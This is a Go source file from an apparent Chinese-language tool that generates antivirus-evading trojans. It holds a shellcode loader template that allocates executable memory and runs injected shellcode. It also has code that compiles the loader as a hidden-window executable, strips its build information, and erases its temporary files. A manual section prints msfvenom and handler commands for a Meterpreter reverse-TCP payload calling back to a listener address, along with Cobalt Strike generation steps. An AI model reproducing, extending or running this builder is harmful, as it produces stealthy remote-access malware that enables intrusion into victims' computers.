package core

import (
	"CuiRi/gologger"
	_ "CuiRi/statik"
	"bytes"
	"fmt"
	"github.com/qianlnk/pgbar"
	"github.com/rakyll/statik/fs"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"sync"
	"time"
)

//免杀代码上半部分
var str1 = `
package main

import (
    "os"
    "syscall"
    "unsafe"
    "encoding/hex"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32       = syscall.MustLoadDLL("kernel32.dll")
    ntdll          = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
    shellcodes = "`

//免杀代码下半部分
var str2 = `"

)

func checkErr(err error) {
    if err != nil {
        if err.Error() != "The operation completed successfully." {
            println(err.Error())
            os.Exit(1)
        }
    }
}

func main() {
    var shellcode []byte
    shellcode,_= hex.DecodeString(shellcodes)
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        checkErr(err)
    }
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    checkErr(err)
    syscall.Syscall(addr, 0, 0, 0, 0)
}`

func Start(options *Options) {
	if options.Manual {
		fmt.Println(`
Metasploit生成木马：
	msfvenom -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.52.128 lport=3333 -f c
	
	监听语句：handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.52.128 -P 3333

Cobalt Strike生成木马：
	攻击 -> 生成后门 -> Payload Generator
		`)
		os.Exit(0)
	}

	gologger.Infof("从文件 %s 中读取shellcode...\n",options.FileName)
	filedata, err := ioutil.ReadFile(options.FileName)
	if err != nil {
		gologger.Fatalf("文件读取错误:%s\n",err.Error())
		return
	} else {
		gologger.Infof("读取文件 %s 成功.\n",options.FileName)
		//fmt.Println(RemoveSpecialCharactar(string(filedata)))
	}

	//创建文件夹
	os.Mkdir("cuiriTemp", 0777)

	//组合免杀代码
	codeText := str1 + RemoveSpecialCharactar(string(filedata)) + str2
	f, err := os.OpenFile("cuiriTemp/main.go", os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	io.WriteString(f, codeText)
	f.Close()
	gologger.Infof("免杀代码组合完成.\n")

	//生成免杀马
	cmd := exec.Command("cmd.exe", "/c", `start go mod init main`)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	cmd.Dir = "cuiriTemp"
	if err := cmd.Run(); err != nil {  //开始执行命令
		gologger.Fatalf("Go语言运行环境缺失，请安装Go语言环境后再使用本工具.")
		return
	}

	cmd2 := exec.Command("cmd.exe", "/c","start","go","build","-ldflags","-H windowsgui -s -w","main.go")
	var stderr2 bytes.Buffer
	cmd2.Stderr = &stderr2
	cmd2.Dir = "cuiriTemp"
	if err := cmd2.Run(); err != nil {  //开始执行命令
		gologger.Fatalf(stderr2.String())
		return
	}

	cmd3 := exec.Command("cmd.exe", "/c", "copy .\\main.exe .\\..\\hoshino.exe && exit")
	var stderr3 bytes.Buffer
	cmd3.Stderr = &stderr3
	cmd3.Dir = "cuiriTemp"
	if err := cmd3.Run(); err != nil {  //开始执行命令
		gologger.Fatalf(stderr3.String())
		return
	}

	statikFS, err := fs.New()
	fs, _ := os.Create("go-strip.exe")
	r, err := statikFS.Open("/go-strip.exe")
	if err != nil {
		gologger.Fatalf("打开资源文件失败:%s", err.Error())
		return
	}
	io.Copy(fs, r)
	fs.Close()

	//删除文件夹
	dir, err := ioutil.ReadDir("cuiriTemp")
	for _, d := range dir {
		os.RemoveAll(path.Join([]string{"cuiriTemp", d.Name()}...))
	}
	os.Remove("cuiriTemp")

	gologger.Infof("已生成木马，正在进行编译信息抹除与字符串混淆...\n")

	//消除免杀马编译信息
	cmd4 := exec.Command("go-strip.exe", "-f","hoshino.exe","-a","-output","hoshinoGen.exe")
	var stderr4 bytes.Buffer
	cmd4.Stderr = &stderr4
	if err := cmd4.Run(); err != nil {  //开始执行命令
		gologger.Fatalf(err.Error(),stderr4.String())
		return
	}

	os.Remove("go-strip.exe")
	os.Remove("hoshino.exe")

	pg := pgbar.NewBar(0, "[GEN]进行程序混淆与痕迹抹除：", 1000)
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 1000; i++ {
			pg.Add()
			time.Sleep(time.Second / 500)
		}
	}()
	wg.Wait()
	fmt.Println("")

	trojanPath,_ := os.Getwd()
	gologger.Infof("成功生成免杀马 %s\n",trojanPath+"\\hoshinoGen.exe\n")
}